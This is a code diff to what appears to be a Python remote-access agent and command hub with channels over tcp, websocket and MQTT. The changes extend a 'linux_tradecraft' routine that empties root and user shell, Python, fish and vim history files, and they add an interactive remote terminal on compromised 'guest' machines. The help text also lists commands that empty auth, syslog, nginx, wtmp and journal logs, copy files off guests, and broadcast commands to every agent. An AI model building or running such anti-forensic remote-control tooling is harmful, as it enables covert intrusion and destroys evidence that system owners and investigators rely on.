@@ -240,16 +240,26 @@ def linux_tradecraft(action, opts):
         if opts.get("all"):
             return root_guard() + (
                 "u={u}\n"
+                "home=$(getent passwd \"$u\" 2>/dev/null | awk -F: 'NR==1 {{ print $6 }}')\n"
+                "if [ -z \"$home\" ]; then home=\"/home/$u\"; fi\n"
+                "echo HOME=$home\n"
                 "wipe_hist() {{\n"
                 "  if [ -f \"$1\" ]; then : > \"$1\" && echo CLEARED=$1; else echo ABSENT=$1; fi\n"
                 "}}\n"
                 "wipe_hist /root/.bash_history\n"
                 "wipe_hist /root/.zsh_history\n"
                 "wipe_hist /root/.sh_history\n"
-                "if [ \"$u\" != root ]; then\n"
-                "  wipe_hist \"/home/$u/.bash_history\"\n"
-                "  wipe_hist \"/home/$u/.zsh_history\"\n"
-                "  wipe_hist \"/home/$u/.sh_history\"\n"
+                "if [ \"$u\" != root ] && [ -d \"$home\" ]; then\n"
+                "  wipe_hist \"$home/.bash_history\"\n"
+                "  wipe_hist \"$home/.zsh_history\"\n"
+                "  wipe_hist \"$home/.sh_history\"\n"
+                "  wipe_hist \"$home/.python_history\"\n"
+                "  wipe_hist \"$home/.local/share/fish/fish_history\"\n"
+                "  find \"$home\" -maxdepth 3 -type f \\( -name '*history*' -o -name '.viminfo' \\) -print | while read -r hist; do\n"
+                "    wipe_hist \"$hist\"\n"
+                "  done\n"
+                "elif [ \"$u\" != root ]; then\n"
+                "  echo NO_HOME=$home\n"
                 "fi\n"
                 "echo DONE\n"
             ).format(u=uq)
@@ -2162,12 +2172,21 @@ class Agent(object):
         except Exception:
             pass
         proc = subprocess.Popen(
-            ["/bin/bash", "--noprofile", "--norc", "-i"],
+            [
+                "/bin/bash",
+                "-c",
+                "if [ -r /lib/terminfo/x/xterm-256color ] || [ -r /usr/share/terminfo/x/xterm-256color ]; then export TERM=xterm-256color; "
+                "elif [ -r /lib/terminfo/x/xterm ] || [ -r /usr/share/terminfo/x/xterm ]; then export TERM=xterm; "
+                "else export TERM=linux; fi; "
+                "export LANG=\"${LANG:-C.UTF-8}\"; "
+                "exec /bin/bash --noprofile --norc -i",
+            ],
             stdin=slave,
             stdout=slave,
             stderr=slave,
             cwd=self.cwd or None,
             preexec_fn=os.setsid,
+            env=dict(os.environ, TERM="xterm-256color", LANG=os.environ.get("LANG") or "C.UTF-8"),
         )
         os.close(slave)
         flags = fcntl.fcntl(master, fcntl.F_GETFL)
@@ -3122,7 +3141,7 @@ commands
   play logs                empty auth, syslog, nginx, wtmp, journal. History stays
   play logs all            same, and wipe bash history too
   shell                    line-by-line remote shell. cd sticks. nano will not
-  tty                      real terminal on the guest. nano works. Ctrl-] detaches
+  tty                      real terminal on the guest. nano works. Type ~~. to leave it
   get <remote> [local]     copy a file off the guest
   put <local> <remote>     copy a file onto the guest
   broadcast <command>      run on every agent that is up
@@ -3387,10 +3406,11 @@ def run_tty(hub, sid):
     channel = hub.channel_of(sid)
     if channel not in ("tcp", "ws", "mqtt"):
         log("{0} will redraw slowly. tcp, ws, or mqtt are the ones for nano.".format(channel))
-    log("remote terminal. Ctrl-] detaches and stops that shell. Your own Ctrl-C goes to the guest.")
+    log("remote terminal. Type ~~. to leave it. Ctrl-] also leaves, when this console sends that key.")
     hub.term_send(sid, "1:{0}:{1}".format(rows, cols))
     fd = sys.stdin.fileno()
     old = termios.tcgetattr(fd)
+    pending = b""
     try:
         tty.setraw(fd)
         while not STOP.is_set():
@@ -3405,10 +3425,13 @@ def run_tty(hub, sid):
             data = os.read(fd, 512)
             if not data:
                 break
-            if b"\x1d" in data:
-                data = data.replace(b"\x1d", b"")
-                if data:
-                    hub.term_send(sid, "2:" + b64e(data))
+            pending = (pending + data)[-16:]
+            if b"\x1d" in data or b"~~." in pending:
+                kept = data.replace(b"\x1d", b"")
+                if b"~~." in pending:
+                    kept = b""
+                if kept:
+                    hub.term_send(sid, "2:" + b64e(kept))
                 break
             hub.term_send(sid, "2:" + b64e(data))
     finally:
